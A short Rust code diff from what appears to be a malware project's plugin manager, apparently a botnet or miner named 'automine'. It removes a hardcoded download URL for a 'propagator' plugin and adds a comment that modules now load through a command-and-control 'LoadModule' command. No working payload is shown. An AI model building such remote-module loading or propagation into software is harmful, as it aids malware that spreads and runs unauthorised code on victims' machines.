@@ -8,7 +8,7 @@ const PLUGIN_DIR: &str = "plugins";
 
 /// Plugin definition: (name, download_url)
 const PLUGINS: &[(&str, &str)] = &[
-    ("propagator", "https://github.com/zvwgvx/automine/releases/latest/download/propagator"),
+    // Features are loaded dynamically via C2 Command "LoadModule"
 ];
 
 pub async fn run_plugin_manager() {
